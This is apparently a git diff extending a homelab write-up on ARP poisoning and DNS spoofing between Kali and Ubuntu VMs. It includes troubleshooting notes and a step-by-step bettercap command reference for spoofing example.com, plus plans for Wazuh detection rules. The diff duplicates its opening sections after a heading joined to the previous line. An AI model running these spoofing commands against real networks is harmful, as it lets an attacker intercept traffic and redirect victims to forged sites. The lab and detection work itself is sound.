@@ -17,6 +17,133 @@ All VMs on the same VMware NAT virtual network (VMnet8), same L2 subnet.
 ## Attack Chain
 
 1. **ARP poisoning** — used `arpspoof` in two directions (victim→gateway, gateway→victim) to position Kali as the man-in-the-middle. Confirmed via `arp -a` on the victim: the gateway's MAC entry changed to Kali's real MAC (`74:97:79:39:df:63`).
+2. **DNS spoofing** — first attempted with `dnsspoof` (dsniff suite) using a hosts-style mapping file redirecting `example.com` to Kali's IP; after `dnsspoof` failed to intercept modern queries (see Issues below), switched to `bettercap`'s DNS spoof module to complete the attack successfully.
+3. **Fake destination** — ran Apache on Kali to serve a page confirming the redirect visually, not just via DNS lookup.
+
+## Issues Encountered & Root-Caused
+
+This lab surfaced two real infrastructure problems that had nothing to do with the spoofing tools themselves — tracking them down was most of the actual work.
+
+### 1. Total DNS resolution failure after enabling ARP spoofing
+**Symptom:** Even unrelated domains (`google.com`) stopped resolving. `dig` timed out talking to the local `systemd-resolved` stub (`127.0.0.53`).
+
+**Diagnosis path:**
+- Confirmed `ip_forward=1` on Kali — already correct, so not the cause
+- Used `tcpdump -i eth0 -e -n port 53` on Kali and saw DNS queries arriving at Kali's MAC only **once** — never re-transmitted onward to the real gateway
+- Checked `iptables -L FORWARD -n -v` → **`policy DROP`**, with all traffic routed into `DOCKER-USER` / `DOCKER-FORWARD` chains
+
+**Root cause:** Docker was installed on the Kali box. Docker rewrites the `FORWARD` chain to a default-deny policy and inserts its own chains ahead of everything else to isolate container traffic — silently breaking any manual IP forwarding for non-container traffic, including this MITM setup.
+
+**Fix:**
+```bash
+sudo iptables -I DOCKER-USER -i eth0 -o eth0 -j ACCEPT
+```
+Verified fix by re-running the `tcpdump` capture with `-e` (show MACs) — each query then appeared **twice**: once arriving at Kali, once leaving toward the real gateway's MAC.
+
+### 2. `dnsspoof` silently ignoring all queries
+**Symptom:** Forwarding confirmed working (traffic flowing both directions in tcpdump), but `dnsspoof` never logged any activity and real DNS answers passed through untouched.
+
+**Diagnosis:** Queries from a modern `dig` include an EDNS0 OPT additional record (visible as `[1au]` in tcpdump output). `dnsspoof` is part of the unmaintained `dsniff` suite and its packet parser predates EDNS0 — it silently drops any query it doesn't recognize instead of erroring.
+
+**Fix:** Switched from `dnsspoof` to `bettercap`, which handles modern DNS traffic (including EDNS0) correctly. Configured the DNS spoof module to answer for `example.com` with the attacker's IP, alongside the existing ARP poisoning.
+
+## Result
+
+Once both issues were resolved and `bettercap` was used for the DNS spoof itself, `dig example.com` and `nslookup example.com` on the victim both resolved to the attacker's IP (`192.168.115.134`) instead of the real IP, confirming a successful DNS spoof:
+
+```
+;; ANSWER SECTION:
+example.com.  1024  IN  A  192.168.115.134
+```
+
+## Bettercap DNS Spoof — Command Reference
+
+Steps to reproduce the working DNS spoof with `bettercap` (used after `dnsspoof` failed to parse modern EDNS0 queries).
+
+**1. Confirm IP forwarding is on (Kali):**
+```bash
+cat /proc/sys/net/ipv4/ip_forward
+# should return 1 — if not:
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+**2. If Docker is installed, allow forwarded traffic through `DOCKER-USER`:**
+```bash
+sudo iptables -I DOCKER-USER -i eth0 -o eth0 -j ACCEPT
+```
+
+**3. Launch bettercap on the correct interface:**
+```bash
+sudo bettercap -iface eth0
+```
+
+**4. Inside the bettercap prompt, start ARP spoofing** (replaces manual `arpspoof` terminals):
+```
+set arp.spoof.targets 192.168.115.130
+arp.spoof on
+```
+
+**5. Configure and start the DNS spoof module:**
+```
+set dns.spoof.domains example.com
+set dns.spoof.address 192.168.115.134
+dns.spoof on
+```
+
+**6. Verify from the victim:**
+```bash
+dig example.com
+nslookup example.com
+```
+Both should resolve `example.com` to `192.168.115.134` instead of the real IP.
+
+**7. Serve a page to visibly confirm the redirect (Kali):**
+```bash
+sudo systemctl start apache2
+sudo ss -tlnp | grep :80    # confirm it's listening
+```
+Then from the victim:
+```bash
+curl example.com
+```
+
+**8. Teardown, inside the bettercap prompt:**
+```
+dns.spoof off
+arp.spoof off
+```
+Then exit bettercap and stop Apache if it was only started for this lab:
+```bash
+sudo systemctl stop apache2
+```
+
+## Key Takeaways
+
+- A successful ARP spoof is a prerequisite for DNS spoofing, but is not sufficient on its own — host-level firewall state (in this case, Docker's iptables rules) can silently swallow forwarded traffic with zero errors, making the ARP layer *look* broken when it isn't.
+- Packet capture with MAC-level visibility (`tcpdump -e`) was the deciding diagnostic step — it distinguished "packet arrived but wasn't forwarded" from "packet never arrived," which pointed straight at iptables instead of the ARP spoof.
+- Legacy security tools like `dnsspoof` may not handle modern protocol extensions (EDNS0) correctly. Always verify a tool is actually intercepting traffic (via its own log output) rather than assuming silence means "nothing to report."
+- `bettercap` is a more actively maintained alternative that handles modern DNS correctly out of the box, and was what ultimately completed the spoof in this lab.
+
+## Next Steps
+- Wire this attack into the Wazuh homelab: log ARP anomalies and DNS query patterns, and write a detection rule for domains resolving to unexpected IPs within a short time window (following the same custom-rule pattern used for the SSH brute-force and port-scan detections).# DNS Spoofing Lab — ARP Poisoning + DNS Spoofing in a VMware Homelab
+
+## Objective
+Simulate a man-in-the-middle DNS spoofing attack in an isolated homelab to understand the full attack chain — ARP poisoning, DNS response forgery, and the infrastructure issues that can silently break it — and connect the results into a Wazuh SIEM detection pipeline.
+
+## Environment
+
+| Role | OS | IP |
+|---|---|---|
+| Attacker | Kali Linux | 192.168.115.134 |
+| Victim | Ubuntu Server | 192.168.115.130 |
+| Gateway (VMware NAT) | — | 192.168.115.2 |
+| Wazuh Manager | — | 192.168.115.129 |
+
+All VMs on the same VMware NAT virtual network (VMnet8), same L2 subnet.
+
+## Attack Chain
+
+1. **ARP poisoning** — used `arpspoof` in two directions (victim→gateway, gateway→victim) to position Kali as the man-in-the-middle. Confirmed via `arp -a` on the victim: the gateway's MAC entry changed to Kali's real MAC (`74:97:79:39:df:63`).
 2. **DNS spoofing** — used `dnsspoof` (dsniff suite) with a hosts-style mapping file redirecting `example.com` to Kali's IP.
 3. **Fake destination** — ran Apache on Kali to serve a page confirming the redirect visually, not just via DNS lookup.
 
